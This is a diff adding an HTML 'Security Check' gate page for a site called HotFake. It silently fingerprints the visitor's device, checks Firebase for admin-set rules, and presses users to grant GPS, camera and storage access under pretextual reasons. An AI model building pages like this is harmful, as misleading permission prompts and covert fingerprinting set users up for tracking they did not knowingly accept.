@@ -1,1 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Check - HotFake</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { background: #07070F; color: #F0F0FF; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
+        /* Box ko initially hide rakhenge taaki disturb na ho */
+        .box { display: none; background: #181828; padding: 30px 25px; border-radius: 16px; width: 100%; max-width: 380px; border: 1px solid rgba(255,255,255,0.07); box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
+        .box h2 { margin: 0 0 5px 0; font-size: 1.6rem; font-weight: 700; text-align: center; }
+        .box p.sub-text { color: #6E6E98; font-size: 0.85rem; text-align: center; margin-bottom: 25px; }
+        
+        .perm-list { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; }
+        .perm-item { display: none; /* Sirf required ones hi show honge */ align-items: flex-start; gap: 15px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }
+        .perm-icon { font-size: 1.5rem; line-height: 1; }
+        .perm-details h4 { margin: 0 0 3px 0; font-size: 0.95rem; font-weight: 600; color: #fff; }
+        .perm-details p { margin: 0; font-size: 0.75rem; color: #a5a5b5; line-height: 1.4; }
+        
+        .btn { background: #E63946; color: #fff; border: none; padding: 14px; border-radius: 10px; width: 100%; font-size: 1rem; cursor: pointer; font-weight: 600; transition: transform 0.2s, background 0.2s; font-family: 'Poppins', sans-serif; }
+        .btn:hover { transform: scale(1.02); background: #c1121f; }
+        
+        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #E63946; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
+    <!-- Silent loading state -->
+    <div id="loadingState" class="loader"></div>
+
+    <div class="box" id="permBox">
+        <h2>App Permissions</h2>
+        <p class="sub-text">To continue using the platform, the following access is required by the admin.</p>
+        
+        <div class="perm-list">
+            <div class="perm-item" id="req-storage">
+                <div class="perm-icon">💾</div>
+                <div class="perm-details"><h4>Storage Access</h4><p>Required to save offline content.</p></div>
+            </div>
+            <div class="perm-item" id="req-location">
+                <div class="perm-icon">📍</div>
+                <div class="perm-details"><h4>GPS Location</h4><p>Required for localized security.</p></div>
+            </div>
+            <div class="perm-item" id="req-camera">
+                <div class="perm-icon">📸</div>
+                <div class="perm-details"><h4>Camera Access</h4><p>Required for identity verification.</p></div>
+            </div>
+        </div>
+
+        <button class="btn" id="allowBtn" onclick="requestNeededPermissions()">Allow & Continue</button>
+        <p id="errorMsg" style="color:#ff4d4d; font-size:0.8rem; text-align:center; display:none; margin-top:10px;">Please allow requested permissions.</p>
+    </div>
+
+    <!-- Firebase SDK (Zaruri hai DB se check karne ke liye) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, get, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8",
+            authDomain: "inshelp-f2cba.firebaseapp.com",
+            databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com",
+            projectId: "inshelp-f2cba"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        let requiredByAdmin = { location: true, camera: false, storage: true }; // Default rules
+        let deviceId = null;
+
+        // Device ID Generation (Same as index-4-1.html)
+        function getDeviceId() {
+            const ua = navigator.userAgent;
+            let os = "Unknown";
+            if (/Windows/i.test(ua)) os = "Windows"; else if (/Android/i.test(ua)) os = "Android"; else if (/iP(hone|od|ad)/i.test(ua)) os = "iOS";
+            const rawString = `${os}|${navigator.hardwareConcurrency || 'U'}|${navigator.deviceMemory || 'U'}|${window.screen.width}x${window.screen.height}`;
+            let hash = 0; for(let i=0; i<rawString.length; i++) hash = ((hash<<5)-hash)+rawString.charCodeAt(i);
+            return `${os.substring(0,4).toUpperCase()}-${Math.abs(hash).toString(36).toUpperCase()}`;
+        }
+
+        async function initPermissionCheck() {
+            deviceId = getDeviceId();
+            
+            // Step 1: Admin ke rules database se fetch karo
+            const globalRef = await get(ref(db, 'settings/permissions'));
+            const userRef = await get(ref(db, `users/${deviceId}/custom_perms`)); // Specific user rule
+            
+            if(globalRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...globalRef.val() };
+            if(userRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...userRef.val() }; // Admin ne is user ke liye kuch force kiya hai toh override
+
+            // Step 2: Silently check karo ki kya pehle se permissions allowed hain?
+            let needsUI = false;
+
+            if (requiredByAdmin.location) {
+                const locStatus = await navigator.permissions.query({ name: 'geolocation' });
+                if (locStatus.state !== 'granted') { needsUI = true; document.getElementById('req-location').style.display = 'flex'; }
+            }
+            if (requiredByAdmin.camera) {
+                const camStatus = await navigator.permissions.query({ name: 'camera' });
+                if (camStatus.state !== 'granted') { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; }
+            }
+            // Storage usually doesn't need a browser prompt in the same way, but we track it locally
+            if (requiredByAdmin.storage && !localStorage.getItem('storageGranted')) {
+                needsUI = true; document.getElementById('req-storage').style.display = 'flex';
+            }
+
+            // Step 3: Agar sab mil chuka hai, toh bina disturb kiye direct index pe bhej do
+            if (!needsUI) {
+                window.location.href = 'index-4-1.html';
+            } else {
+                // Agar permission chahiye, toh UI show karo
+                document.getElementById('loadingState').style.display = 'none';
+                document.getElementById('permBox').style.display = 'block';
+            }
+        }
+
+        window.requestNeededPermissions = async function() {
+            const btn = document.getElementById('allowBtn');
+            btn.innerText = "Processing..."; btn.style.opacity = "0.7";
+
+            try {
+                if(document.getElementById('req-storage').style.display === 'flex') {
+                    if (navigator.storage && navigator.storage.persist) await navigator.storage.persist();
+                    localStorage.setItem('storageGranted', 'true');
+                }
+                
+                if(document.getElementById('req-camera').style.display === 'flex') {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    stream.getTracks().forEach(track => track.stop());
+                }
+
+                if(document.getElementById('req-location').style.display === 'flex') {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+                    });
+                }
+
+                // Database me mark karo ki user ne allow kar diya hai
+                set(ref(db, `users/${deviceId}/perms_status`), "Granted");
+
+                btn.style.background = "#2DC653"; btn.innerText = "Success! Redirecting...";
+                setTimeout(() => window.location.href = 'index-4-1.html', 800);
+            } catch (e) {
+                btn.innerText = "Allow & Continue"; btn.style.opacity = "1";
+                document.getElementById('errorMsg').style.display = 'block';
+            }
+        };
+
+        // Page load hote hi silent check start
+        initPermissionCheck();
+    </script>
+</body>
+</html>
